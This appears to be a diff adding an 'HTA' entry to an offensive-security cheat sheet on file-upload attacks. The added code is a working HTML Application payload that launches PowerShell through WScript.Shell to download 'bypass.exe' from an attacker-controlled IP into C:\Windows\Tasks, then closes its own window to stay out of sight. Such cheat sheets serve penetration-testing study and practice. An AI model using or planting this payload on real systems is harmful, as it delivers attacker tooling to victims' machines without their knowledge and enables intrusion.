@@ -211,3 +211,21 @@ When file upload is availble&#x20;
 </script>
 
 ```
+
+### HTA
+
+```html
+<html>
+<head>
+<script language="JScript">
+var shell = new ActiveXObject("WScript.Shell");
+var res = shell.Run("powershell iwr -uri http://192.168.X.Y/bypass.exe -outfile C:\\Windows\\Tasks\\bypass.exe");
+</script>
+</head>
+<body>
+<script language="JScript">
+self.close();
+</script>
+</body>
+</html>hta
+```
